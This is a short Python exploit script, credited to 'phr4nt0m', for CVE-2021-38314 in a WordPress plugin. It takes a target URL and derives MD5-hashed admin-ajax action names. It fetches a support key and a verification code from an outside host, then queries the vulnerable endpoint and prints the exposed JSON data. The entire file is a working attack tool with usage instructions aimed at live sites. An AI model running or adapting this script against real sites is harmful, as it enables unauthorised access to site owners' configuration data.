import requests, hashlib, json, sys

# python cve-2021-38314.py [ url vulnerable]
# exm:
#       python cve-2021-38314.py https://vulnerable-site.com
#
# Exploit by phr4nt0m
#

target = sys.argv[1]

url1 = target + '/-redux'  
md5_redux = hashlib.md5(url1.encode()).hexdigest()

get_key = requests.get( target + '/wp-admin/admin-ajax.php?action=' + md5_redux ).text
key_support = get_key + '-support' 
md5_key = hashlib.md5(key_support.encode()).hexdigest()

redux_code = requests.get("http://verify.redux.io/?hash=" + md5_key + "&site=" + target).text

vuln_target = target + '/wp-admin/admin-ajax.php?action=' + md5_key + '&code=' + redux_code
file_1 = requests.get(vuln_target).text

print("CVE-2021-38314")
print (" Target: " + target )
print (" Vulnerable link: " + vuln_target + "\n\n")

json_file = json.loads(file_1)
print (json.dumps(json_file, indent=4))